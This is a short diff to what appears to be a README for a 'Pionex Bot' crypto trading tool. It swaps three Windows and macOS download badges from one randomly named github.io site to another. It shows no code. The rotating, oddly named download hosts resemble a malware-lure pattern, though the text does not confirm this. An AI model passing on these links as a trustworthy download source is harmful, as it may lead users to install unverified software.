@@ -25,7 +25,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Pionex_Bot-1DA462?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
+[![Download](https://img.shields.io/badge/⬇_Download_Pionex_Bot-1DA462?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -54,8 +54,8 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -77,7 +77,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Pionex_Bot-1DA462?style=for-the-badge)](https://zenboulderagora.github.io/Windw/)
+[![Download](https://img.shields.io/badge/⬇_Download_Pionex_Bot-1DA462?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
